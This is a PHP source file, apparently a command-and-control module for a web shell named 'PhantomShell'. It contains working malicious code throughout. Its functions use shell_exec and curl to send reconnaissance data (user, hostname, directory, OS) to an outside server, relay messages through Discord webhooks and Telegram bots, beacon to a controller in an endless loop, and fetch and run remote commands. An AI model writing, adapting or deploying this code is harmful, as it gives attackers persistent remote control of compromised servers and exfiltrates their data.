<?php
// PhantomShell Module: C2 Integration
// Load via MINIMAL mode: fetch c2

function mod_c2_discord($webhook_url, $message) {
    $data = json_encode(array('content' => $message, 'username' => 'PhantomShell'));
    if(function_exists('shell_exec'))
        @shell_exec("curl -s -H 'Content-Type: application/json' -d " . escapeshellarg($data) . " " . escapeshellarg($webhook_url) . " 2>&1");
    return true;
}

function mod_c2_telegram($token, $chat_id, $message) {
    $msg = urlencode($message);
    if(function_exists('shell_exec'))
        @shell_exec("curl -s 'https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msg' 2>&1");
    return true;
}

function mod_c2_http($url, $data = null) {
    if (!$data) {
        $data = array(
            'user' => function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'unknown',
            'host' => gethostname(),
            'cwd'  => getcwd(),
            'os'   => php_uname('s') . ' ' . php_uname('r'),
            'php'  => phpversion(),
        );
    }
    $json = json_encode($data);
    if(function_exists('shell_exec'))
        @shell_exec("curl -s -X POST -H 'Content-Type: application/json' -d " . escapeshellarg($json) . " " . escapeshellarg($url) . " 2>&1");
    return true;
}

function mod_c2_beacon($url, $interval = 60) {
    while (true) {
        mod_c2_http($url, array(
            'type'  => 'beacon',
            'host'  => gethostname(),
            'time'  => date('Y-m-d H:i:s'),
            'cwd'   => getcwd(),
        ));
        sleep($interval);
    }
}

function mod_c2_poll($url) {
    $o = '';
    if(function_exists('shell_exec'))
        $o = (string)@shell_exec("curl -s " . escapeshellarg($url) . " 2>&1");
    $cmd = json_decode($o, true);
    if (isset($cmd['command'])) {
        $result = '';
        if(function_exists('shell_exec')) $result = (string)@shell_exec($cmd['command'] . ' 2>&1');
        return $result;
    }
    return null;
}

if (isset($sock)) {
    @fwrite($sock, "  C2 module loaded.\n");
    @fwrite($sock, "  Functions: mod_c2_discord, mod_c2_telegram, mod_c2_http, mod_c2_beacon, mod_c2_poll\n");
}
?>
